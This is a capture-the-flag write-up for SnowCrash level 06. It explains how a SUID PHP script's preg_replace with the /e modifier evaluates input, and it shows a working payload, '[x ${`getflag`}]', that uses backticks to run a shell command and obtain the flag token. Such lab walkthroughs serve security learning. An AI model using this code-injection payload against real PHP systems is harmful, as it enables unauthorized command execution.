# Level 06

- Once logged in, there are couple files in the home dir.

```
???$ ssh level06@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level06@localhost's password:
level06@SnowCrash:~$
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$
```

To check more detail,

```
level06@SnowCrash:~$ ls -ls
total 12
8 -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
4 -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
we can see SUID executable and a PHP script is located.

let's run `level06`, and take a look at `level06.php`

```
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```
```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
to break down, you will get a php script like this, down below.
```
#!/usr/bin/php
<?php
function y($m) {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
}
function x($y, $z) {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```
For line where `regex` has `/..../e`, take a look at this [link](http://www.madirish.net/402), which explains it basically executes second argument, if it fulfills the condition.

And on this part of the `regex` (by `/(\[x (.*)\])/e`):
- if `$a` is in form of `[x ${asdfa}]`, it will be first be replaced by second argument of function `"y(\"\\2\")"`

**And it is possible to execute shell in PHP with backticks.**

so, the sufficient form that needs to be passed will be:

```
[x ${`getflag`}]
```

```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/testing
level06@SnowCrash:~$ ./level06 /tmp/testing
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```
